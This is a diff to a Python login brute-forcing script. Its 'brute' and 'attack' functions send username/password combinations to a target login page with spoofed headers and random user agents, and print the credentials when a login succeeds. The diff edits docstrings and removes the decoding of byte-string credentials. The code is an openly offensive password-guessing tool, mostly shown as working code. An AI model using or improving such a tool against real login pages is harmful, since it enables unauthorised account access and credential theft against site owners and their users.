@@ -13,7 +13,7 @@ import ssl
 
 def brute(parameters):
     '''
-    tries all option for usernames and passwords on the login page
+    sends all combinations for usernames and passwords to the attack function on the login page
     '''
     content = {'url': parameters['url'],
                'method': parameters['method'],
@@ -55,18 +55,8 @@ def brute(parameters):
 
 def attack(content):
     '''
-
+   creat a packet containing fake headers and the payload(username,password) and submit it to the server
     '''
-
-    if isinstance(content['username'],bytes):
-        user =  content['username'].decode('utf-8')
-    else:
-        user = content['username']
-    if isinstance(content['password'],bytes):
-        pwd =  content['password'].decode('utf-8')
-    else:
-        pwd = content['password']
-
 
     url = content['url']
 
@@ -89,10 +79,10 @@ def attack(content):
     else:
         resp = requests.get(url,data=payload,headers=headers)
 
-    print('[+][attack] trying' + ' username:' + user + ' password:' + pwd)
+    print('[+][attack] trying' + ' username:' + content['username'] + ' password:' + content['password'])
 
     if check_login(resp, content['password_param']):
-        print('login successfull\n\nusername: ' + user + '\npassword: ' + pwd)
+        print('login successfull\n\nusername: ' + content['username'] + '\npassword: ' + content['password'])
         exit(0)
 
 def get_random_user_agent():
